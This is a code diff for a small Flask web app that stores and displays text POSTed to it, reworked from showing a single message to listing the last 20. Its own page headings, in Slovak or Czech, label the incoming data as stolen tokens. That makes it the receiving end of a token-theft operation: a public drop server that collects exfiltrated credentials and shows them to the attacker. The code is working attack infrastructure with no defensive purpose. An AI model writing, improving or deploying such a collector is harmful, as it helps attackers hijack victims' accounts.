@@ -1,46 +1,70 @@
-from flask import Flask, request, render_template_string
 import os
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Global variable to store the message in memory
-latest_message = "No data received yet."
+# Changed from a single string to a list to store multiple messages
+messages_history = []
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Live Data Stream</title>
-    <!-- Refreshes the page every 5 seconds to show new data automatically -->
+    <title>tokeny mnam mnam</title>
+    <!-- Refreshes the page every 5 seconds to grab new data -->
     <meta http-equiv="refresh" content="10"> 
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f9f9f9; }
+        .history-container { max-width: 600px; margin: 0 auto; text-align: left; }
+        .message-box { 
+            color: #2bc48a; 
+            background: #ffffff; 
+            padding: 15px; 
+            margin-bottom: 10px; 
+            border-radius: 8px; 
+            border-left: 5px solid #2bc48a;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .empty { color: #888; font-style: italic; }
+    </style>
 </head>
-<body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-    <h2>ukradeny tokeny:</h2>
-    <h1 style="color: #2bc48a; background: #f0f0f0; padding: 20px; display: inline-block; border-radius: 10px;">
-        {{ message }}
-    </h1>
+<body>
+    <h2>tekeny ukradeny:</h2>
+    
+    <div class="history-container">
+        {% if not history %}
+            <p class="empty">No data received yet.</p>
+        {% else %}
+            <!-- Loops through the list backward so the newest message is always at the top -->
+            {% for msg in history[::-1] %}
+                <div class="message-box">
+                    <strong>&gt;</strong> {{ msg }}
+                </div>
+            {% endfor %}
+        {% endif %}
+    </div>
 </body>
 </html>
 """
 
 @app.route("/", methods=["GET", "POST"])
 def home():
-    global latest_message
+    global messages_history
     
-    # If your local computer sends data via POST, update the message
     if request.method == "POST":
         data = request.get_json()
         if data and "text" in data:
-            latest_message = data["text"]
+            # Append the new message to our list history
+            messages_history.append(data["text"])
+            
+            # Optional: Keep only the last 20 messages so memory doesn't grow forever
+            if len(messages_history) > 20:
+                messages_history.pop(0)
+                
         return {"status": "success"}, 200
         
-    # If a regular browser visits the page, show the HTML
-    return render_template_string(HTML_TEMPLATE, message=latest_message)
-
-
+    return render_template_string(HTML_TEMPLATE, history=messages_history)
 
 if __name__ == "__main__":
-    # Render assigns a port dynamically. If none is found, default to 5000.
     port = int(os.environ.get("PORT", 5000))
-    # You MUST bind to 0.0.0.0 so Render can see the app
     app.run(host="0.0.0.0", port=port)
